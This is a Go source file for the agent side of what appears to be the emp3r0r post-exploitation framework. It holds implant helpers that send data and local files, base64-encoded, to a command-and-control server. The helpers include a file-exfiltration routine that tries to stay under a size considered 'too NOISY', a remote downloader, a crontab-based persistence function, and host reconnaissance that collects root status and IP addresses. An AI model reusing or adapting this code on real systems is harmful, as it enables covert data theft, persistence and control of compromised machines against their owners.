package agent

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	gops "github.com/mitchellh/go-ps"
	"github.com/zcalusic/sysinfo"
)

// IsCommandExist check if an executable is in $PATH
func IsCommandExist(exe string) bool {
	_, err := exec.LookPath(exe)
	return err == nil
}

// IsProcAlive check if a process name exists, returns its PID
func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
	allprocs, err := gops.Processes()
	if err != nil {
		log.Println(err)
		return
	}

	for _, p := range allprocs {
		if p.Executable() == procName {
			alive = true
			proc, err := os.FindProcess(p.Pid())
			if err != nil {
				log.Println(err)
			}
			procs = append(procs, proc)
		}
	}

	return
}

// IsFileExist check if a file exists
func IsFileExist(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	}
	return true
}

// IsAgentRunning is there any emp3r0r agent already running?
func IsAgentRunning() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := ioutil.WriteFile(PIDFile, []byte(myPIDText), 0600); err != nil {
			log.Printf("Write PIDFile: %v", err)
		}
	}()

	pidBytes, err := ioutil.ReadFile(PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// Send2CC send TunData to CC
func Send2CC(data *MsgTunData) error {
	var out = json.NewEncoder(H2Json)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// RandInt random int between given interval
func RandInt(min, max int) int {
	seed := rand.NewSource(time.Now().UTC().Unix())
	return min + rand.New(seed).Intn(max-min)
}

// Download download via HTTP
func Download(url, path string) (err error) {
	var (
		resp *http.Response
		data []byte
	)
	resp, err = HTTPClient.Get(url)
	if err != nil {
		return
	}

	data, err = ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return
	}

	return ioutil.WriteFile(path, data, 0600)
}

// AppendToFile append text to a file
func AppendToFile(filename string, text string) (err error) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()

	if _, err = f.WriteString(text); err != nil {
		return
	}
	return
}

// Copy copy file from src to dst
func Copy(src, dst string) error {
	in, err := ioutil.ReadFile(src)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(dst, in, 0755)
}

// GetKernelVersion uname -r
func GetKernelVersion() (ver string) {
	var si sysinfo.SysInfo
	si.GetSysInfo()

	return si.Kernel.Release
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *SystemInfo {
	var (
		si   sysinfo.SysInfo
		info SystemInfo
	)
	si.GetSysInfo() // read sysinfo

	info.Tag = Tag

	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
	info.Kernel = si.Kernel.Release
	info.Arch = si.Kernel.Architecture
	info.CPU = fmt.Sprintf("%s (x%d)", si.CPU.Model, getCPUCnt())
	info.Mem = fmt.Sprintf("%d kB", getMemSize())
	info.Hardware = CheckProduct()
	info.Container = CheckContainer()

	// have root?
	info.HasRoot = os.Geteuid() == 0

	// IP address?
	info.IPs = collectLocalIPs()

	return &info
}

// CheckAccount : check account info by parsing /etc/passwd
func CheckAccount(username string) (accountInfo map[string]string, err error) {
	passwdData, err := ioutil.ReadFile("/etc/passwd")
	lines := strings.Split(string(passwdData), "\n")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		accountInfo["username"] = fields[0]
		if username != accountInfo["username"] {
			return nil, errors.New("User not found")
		}
		accountInfo["home"] = fields[len(fields)-2]
		accountInfo["shell"] = fields[len(fields)-1]
	}
	return
}

// AddCronJob add a cron job without terminal
// this creates a cron job for whoever runs the function
func AddCronJob(job string) error {
	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
	cmd := exec.Command("/bin/sh", "-c", cmdStr)
	return cmd.Start()
}

func getMemSize() (size int) {
	var err error
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lineSplit := strings.Fields(scanner.Text())

		if lineSplit[0] == "MemTotal:" {
			size, err = strconv.Atoi(lineSplit[1])
			if err != nil {
				size = 0
			}
		}
	}

	return
}
func getCPUCnt() (cpuCnt int) {
	f, err := os.Open("/proc/cpuinfo")
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		if strings.HasPrefix(line, "processor") {
			cpuCnt++
		}
	}

	return
}

func collectLocalIPs() (ips []string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			ipaddr := ip.String()
			if ipaddr == "::1" ||
				ipaddr == "127.0.0.1" ||
				strings.HasPrefix(ipaddr, "fe80:") {
				continue
			}

			ips = append(ips, ipaddr)
		}
	}

	return
}

// send local file to CC
func file2CC(filepath string) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}
	// file sha256sum
	sum := sha256.Sum256(bytes)
	checksum = fmt.Sprintf("%x", sum)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return checksum, errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := MsgTunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}
